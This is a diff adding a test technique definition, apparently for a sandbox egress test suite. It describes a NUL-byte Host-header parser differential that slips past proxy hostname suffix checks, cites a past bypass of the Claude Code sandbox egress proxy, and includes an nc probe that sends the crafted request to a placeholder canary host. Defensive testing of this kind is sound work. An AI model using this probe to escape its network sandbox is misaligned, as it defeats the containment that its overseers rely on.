@@ -1,0 +1,17 @@
+id = "net-nullbyte-hostname"
+name = "Hostname parser differential with embedded NUL byte"
+category = "net"
+description = "Crafts an HTTP request whose Host header contains an embedded NUL byte (evil\\0.allowed.example). Proxy layers that validate the hostname with string suffix checks (endsWith) accept it, while resolvers and parsers truncate at the NUL: the same class as the SOCKS5 parser differential that bypassed the Claude Code egress proxy (sandbox-runtime < 0.0.43, fixed 2026-04-01, no CVE assigned)."
+references = [
+  "Claude Code sandbox-runtime SOCKS5 null-byte hostname differential (2.0.24 - 2.1.89)",
+  "CVE-2025-66479: earlier bypass of the same proxy",
+]
+
+probe = '''
+printf 'GET /hit/@@TECH_ID@@/@@NONCE@@ HTTP/1.0\r\nHost: evil%ballowed.example\r\n\r\n' '\0' \
+  | nc @@CANARY_HOST@@ @@CANARY_PORT@@ >/dev/null 2>&1
+'''
+
+[preconditions]
+bins = ["nc"]
+oracle = "canary"
